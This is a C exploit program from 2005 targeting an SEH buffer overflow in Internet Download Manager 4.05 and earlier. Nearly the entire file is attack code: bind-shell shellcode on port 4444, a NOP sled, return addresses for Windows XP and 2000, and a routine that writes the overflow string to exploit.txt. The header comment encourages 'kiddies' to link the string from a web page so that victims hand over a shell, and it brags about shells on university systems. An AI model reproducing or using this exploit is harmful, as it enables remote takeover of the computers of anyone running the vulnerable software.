/*

  Title : Internet Download Manager  =< 4.05 universal remote overflow Exploit
  bug analyse and exploit code by : c0d3r "Kaveh Razavi" c0d3r@ihsteam.com
  my advisory : http://www.ihsteam.com/advisory/download_manager_adv.txt
  
  ************************************************************************
  
  this bug is differnt from what was found in application called altnet
  download manager .
  if you read the code carefully you see that I left thingz for you .
  well if you want to creat an html file linked to evil download offer
  needed thingz are there , but in IE they are not usable cause exploit
  string is bigger that IE input buffer .
  I was analysing this bug and I was thinking about how to code an exploit
  for this issue , then new Mozilla exploit came up ! yea the idea of saving
  the exploit string into a file then copy/paste it to download manager 
  inpute url . there are other ways for sure . kiddies still can have fun
  with this code just as I mentioned with a bit scripting in java or other 
  shits you can link exploit string which will be created in file exploit.txt
  you can have a bad file , anyone using download manager can give a shell !
  hint! : any other folder is being counted , so my suggestion is linking to 
  root webfolder .
  sample usage shown in a 1 minute movie which can be downloaded at :
  http://www.ihsteam.com/download/video/dlm.rar
  
  ************************************************************************

  Exploit method : Structured Exception Handling known as SEH .
  Targets : should work on all win2000 and win xp's even sp2 ,
  Tested : winxp sp 1 and win2000 server sp 4
  compile : ms visual c++ 6 : cl dlm.c
  
  ************************************************************************

  Greetingz :
  
  www.ihsteam.com      LorD and NT , LorD always makes me happy with those
  www.ihssecurity.com  Nasa , berkely , stanford ,... shells :>
  www.exploitdev.com   yeah me and jamie are just started , u r0x jamie ,
  www.metasploit.com   fewer words better ones , great !
  www.class101.org     nice work is being done here ! class I used ur offsets :)
  www.c0d3r.org        my home ,nth here right now but those nice Essence words.
  other Folks and friends not mentioned here .

*/ 


#include <stdio.h>
#include <string.h>
#include <windows.h>
#define exploit "exploit.txt"
#define NOP 0x90
#define size 2519
  
  int main(int argc,char **argv)
{

/*
char crap1[]=  
"\x3C\x48\x45\x41\x44\x3E"
"\x3C\x6D\x65\x74\x61\x20\x68\x74\x74\x70\x2D\x65"
"\x71\x75\x69\x76\x3D\x22\x43\x6F\x6E\x74\x65\x6E"
"\x74\x2D\x54\x79\x70\x65\x22\x20\x63\x6F\x6E\x74"
"\x65\x6E\x74\x3D\x22\x74\x65\x78\x74\x2F\x68\x74"
"\x6D\x6C\x3B\x20\x63\x68\x61\x72\x73\x65\x74\x3D"
"\x69\x73\x6F\x2D\x38\x38\x35\x39\x2D\x31\x22\x3E"
"\x3C\x6D\x65\x74\x61\x20\x68\x74\x74\x70\x2D\x65"
"\x71\x75\x69\x76\x3D\x22\x72\x65\x66\x72\x65\x73"
"\x68\x22\x20\x63\x6F\x6E\x74\x65\x6E\x74\x3D\x22"
"\x33\x3B\x20\x55\x52\x4C\x3D";
char crap2[]= "\x22\x3E";
char crap3[]=
"\x3C\x2F\x68\x65\x61\x64\x3E"
"\x3C\x2F\x42\x4F\x44\x59\x3E"
"\x3C\x2F\x48\x54\x4D\x4C\x3E";
*/
  char crap4[]= "\x31\x31\x2E";


// metasploit shellc0de wow!!! LPORT=4444 Size=399  
     unsigned char shellcode[] =
"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\x4f\x85"
"\x2f\x98\x83\xeb\xfc\xe2\xf4\xb3\x6d\x79\x98\x4f\x85\x7c\xcd\x19"
"\xd2\xa4\xf4\x6b\x9d\xa4\xdd\x73\x0e\x7b\x9d\x37\x84\xc5\x13\x05"
"\x9d\xa4\xc2\x6f\x84\xc4\x7b\x7d\xcc\xa4\xac\xc4\x84\xc1\xa9\xb0"
"\x79\x1e\x58\xe3\xbd\xcf\xec\x48\x44\xe0\x95\x4e\x42\xc4\x6a\x74"
"\xf9\x0b\x8c\x3a\x64\xa4\xc2\x6b\x84\xc4\xfe\xc4\x89\x64\x13\x15"
"\x99\x2e\x73\xc4\x81\xa4\x99\xa7\x6e\x2d\xa9\x8f\xda\x71\xc5\x14"
"\x47\x27\x98\x11\xef\x1f\xc1\x2b\x0e\x36\x13\x14\x89\xa4\xc3\x53"
"\x0e\x34\x13\x14\x8d\x7c\xf0\xc1\xcb\x21\x74\xb0\x53\xa6\x5f\xce"
"\x69\x2f\x99\x4f\x85\x78\xce\x1c\x0c\xca\x70\x68\x85\x2f\x98\xdf"
"\x84\x2f\x98\xf9\x9c\x37\x7f\xeb\x9c\x5f\x71\xaa\xcc\xa9\xd1\xeb"
"\x9f\x5f\x5f\xeb\x28\x01\x71\x96\x8c\xda\x35\x84\x68\xd3\xa3\x18"
"\xd6\x1d\xc7\x7c\xb7\x2f\xc3\xc2\xce\x0f\xc9\xb0\x52\xa6\x47\xc6"
"\x46\xa2\xed\x5b\xef\x28\xc1\x1e\xd6\xd0\xac\xc0\x7a\x7a\x9c\x16"
"\x0c\x2b\x16\xad\x77\x04\xbf\x1b\x7a\x18\x67\x1a\xb5\x1e\x58\x1f"
"\xd5\x7f\xc8\x0f\xd5\x6f\xc8\xb0\xd0\x03\x11\x88\xb4\xf4\xcb\x1c"
"\xed\x2d\x98\x5e\xd9\xa6\x78\x25\x95\x7f\xcf\xb0\xd0\x0b\xcb\x18"
"\x7a\x7a\xb0\x1c\xd1\x78\x67\x1a\xa5\xa6\x5f\x27\xc6\x62\xdc\x4f"
"\x0c\xcc\x1f\xb5\xb4\xef\x15\x33\xa1\x83\xf2\x5a\xdc\xdc\x33\xc8"
"\x7f\xac\x74\x1b\x43\x6b\xbc\x5f\xc1\x49\x5f\x0b\xa1\x13\x99\x4e"
"\x0c\x53\xbc\x07\x0c\x53\xbc\x03\x0c\x53\xbc\x1f\x08\x6b\xbc\x5f"
"\xd1\x7f\xc9\x1e\xd4\x6e\xc9\x06\xd4\x7e\xcb\x1e\x7a\x5a\x98\x27"
"\xf7\xd1\x2b\x59\x7a\x7a\x9c\xb0\x55\xa6\x7e\xb0\xf0\x2f\xf0\xe2"
"\x5c\x2a\x56\xb0\xd0\x2b\x11\x8c\xef\xd0\x67\x79\x7a\xfc\x67\x3a"
"\x85\x47\x68\xc5\x81\x70\x67\x1a\x81\x1e\x43\x1c\x7a\xff\x98";
    FILE *fp;  
    char buffer[size];
    unsigned int os;
    char ppr[5];
    char jmp[] = "\xEB\x0C\x90\x90";
    char winxp[] = "\xB1\x2C\xC2\x77"; 
    char win2000[] ="\x08\xB0\x01\x78";
    if(argc < 2) {
    printf("\n-------- Download Manager remote exploit\n");
    printf("-------- copyrighted by c0d3r of IHS 2005\n");
    printf("-------- usage : dlm.exe target\n");
    printf("-------- target 1 : windows xp all service packs all languages : 0\n");
    printf("-------- target 2 : windows 2000 all service packs all languages : 1\n");
    printf("-------- eg : dlm.exe 0\n");	
    printf("-------- out file will be exploit.txt for windows xp\n\n");
    exit(-1) ;
  } 
    os = (unsigned short)atoi(argv[1]); 	 
    switch(os)
  {
    case 0:
    strcat(ppr,winxp);
    break;
    case 1:
    strcat(ppr,win2000); 
    break;
    default:
    printf("\n[-] this target doesnt exist in the list\n\n");
   
    exit(-1);
  }
   printf("\n-------- Download Manager remote exploit\n");
   printf("-------- copyrighted by c0d3r of IHS 2005\n");
   
    // heart of exploit
   
    printf("-------- building overflow string\n");
    memset(buffer,NOP,size);
    memcpy(buffer,crap4,sizeof(crap4)-1);
	memcpy(buffer+3+2077,jmp,4);
	memcpy(buffer+3+2077+4,ppr,4);
	memcpy(buffer+3+2077+4+40,shellcode,sizeof(shellcode)-1);
	buffer[size] = 0;
  
	/*
    memcpy(buffer,crap1,sizeof(crap1)-1);
	memcpy(buffer+122,crap4,sizeof(crap4)-1);
    memcpy(buffer+2192,jmp,4);
    memcpy(buffer+2196,ppr,4);
    memcpy(buffer+2200,shellcode,sizeof(shellcode)-1);
    memcpy(buffer+2599,crap2,sizeof(crap2)-1);
    memcpy(buffer+2601,crap3,sizeof(crap3)-1);
    buffer[size] = 0;
    */
	
    // EO heart of exploit  
     
	printf("-------- Done !\n");
    printf("-------- Creating the exploit.txt file\n");
    fp = fopen(exploit, "w+");
    fwrite(buffer, sizeof ( unsigned char ), sizeof(buffer), fp);
    fclose(fp);
    printf("-------- Done ! enjoy it !\n");
    return 0;

}
